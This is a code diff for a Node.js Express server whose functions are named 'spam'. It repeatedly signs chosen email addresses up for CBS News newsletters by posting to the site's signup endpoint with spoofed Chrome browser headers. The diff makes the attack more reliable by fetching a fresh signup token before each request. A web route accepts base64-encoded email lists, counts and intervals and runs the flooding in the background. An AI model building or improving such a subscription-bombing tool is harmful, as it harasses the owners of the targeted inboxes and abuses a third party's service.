@@ -1,9 +1,8 @@
 const express = require("express");
 const axios = require("axios");
 const path = require("path");
-const { v4: uuidv4 } = require("uuid"); // for generating unique session IDs
+const {v4: uuidv4} = require("uuid"); // for generating unique session IDs
 
-const __dirname = process.cwd();
 const app = express();
 let stopFlag = false;
 
@@ -24,32 +23,40 @@ async function spam(sessionId, theemail) {
     }
 
     try {
-        const response = await axios.post('https://www.cbsnews.com/newsletters/xhr/signup', {
-            headers: {
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'text/plain',
-                'cookie': '',
-                'dnt': '1',
-                'origin': 'https://www.cbsnews.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
-                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
-            },
-            data: `{"email":"${theemail}","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}`
-        });
+
+        const tokenResponse = await axios.get("https://www.cbsnews.com/newsletters/xhr/token");
+        const token = tokenResponse.data.token;
+        const response = await axios.post(
+            'https://www.cbsnews.com/newsletters/xhr/signup',
+            `{"email":"${theemail}","sub":"m40186,m40183","token":"${token}","mCodeOptin":"m40183"}`, {
+                headers: {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'text/plain',
+                    'dnt': '1',
+                    'origin': 'https://www.cbsnews.com',
+                    'priority': 'u=1, i',
+                    'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
+                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+                }
+            }
+        );
 
         sessions[sessionId].num++;
-        console.log(response.data);
+        // console.log(response.data);
     } catch (e) {
-        sessions[sessionId].errs++;
-        sessions[sessionId].errorMessages.push(e.message);
+        if (sessions[sessionId]) {
+            sessions[sessionId].errs++;
+            sessions[sessionId].errorMessages.push(e.message);
+        } else {
+            console.log("ERROR: session " + sessionId + " not found. User probably clicked stop button.");
+        }
     }
 }
 
@@ -76,12 +83,17 @@ function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
 app.use(express.static("static"));
 app.use((req, res, next) => {
     const {
-        headers: { cookie },
+        headers: {
+            cookie
+        },
     } = req;
     if (cookie) {
         const values = cookie.split(";").reduce((res, item) => {
             const data = item.trim().split("=");
-            return { ...res, [data[0]]: data[1] };
+            return {
+                ...res,
+                [data[0]]: data[1]
+            };
         }, {});
         res.locals.cookie = values;
     } else res.locals.cookie = {};
@@ -91,7 +103,11 @@ app.use((req, res, next) => {
 app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
     try {
         const sessionId = uuidv4(); // Generate a unique session ID
-        sessions[sessionId] = { num: 0, errs: 0, errorMessages: [] }; // Initialize session data
+        sessions[sessionId] = {
+            num: 0,
+            errs: 0,
+            errorMessages: []
+        }; // Initialize session data
 
         const id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
         const id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
@@ -105,12 +121,14 @@ app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
         // Execute the spam function without waiting for it
         executeSpam(sessionId, emails, emailCount, emailsToSpam, interval);
 
-        res.cookie("sessionId", sessionId, { httpOnly: true }); // Store session ID in a cookie
+        res.cookie("sessionId", sessionId, {
+            httpOnly: true
+        }); // Store session ID in a cookie
         res.sendFile(path.join(__dirname, "spamPages", "spam.html"));
     } catch (e) {
         res.status(500).send(
             "Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" +
-                e,
+            e,
         );
     }
 });
